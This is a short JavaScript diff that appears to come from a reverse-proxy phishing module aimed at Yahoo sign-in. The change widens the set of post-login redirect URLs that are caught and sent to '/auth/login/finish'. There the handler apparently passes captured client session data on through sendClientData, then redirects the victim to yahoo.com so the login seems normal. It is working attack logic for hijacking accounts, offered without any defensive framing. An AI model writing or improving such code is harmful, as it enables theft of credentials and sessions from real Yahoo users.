@@ -47,12 +47,13 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         const extRedirectObj = super.getExternalRedirect()
         if (extRedirectObj !== null) {
             const rLocation = extRedirectObj.url
-            if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.yahoo.com/' 
-            || rLocation.startsWith('/account/comm-channel/refresh')) {
-                this.browserEndPoint.setHeader('location', '/auth/login/finish')
-            }
-           
-            // this.browserEndPoint.setHeader('location', '/auth/login/finish')
+            const checkUrls = ["https://guce.yahoo.com", "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", "account/comm-channel/refresh"]
+            
+            for (let exitUrl of checkUrls) {
+                if (rLocation.startsWith(exitUrl)) {
+                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
+                }
+            }           
         }
 
         // return super.processResponse()
@@ -96,7 +97,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         }
         if (this.req.url === '/auth/login/finish' || this.req.url === '/account/fb-messenger-linking') {
             super.sendClientData(clientContext, {})
-            this.res.writeHead(302, { location: 'https://mail.yahoo.com'})
+            this.res.writeHead(302, { location: 'https://yahoo.com'})
             return this.res.end('')
         }
 
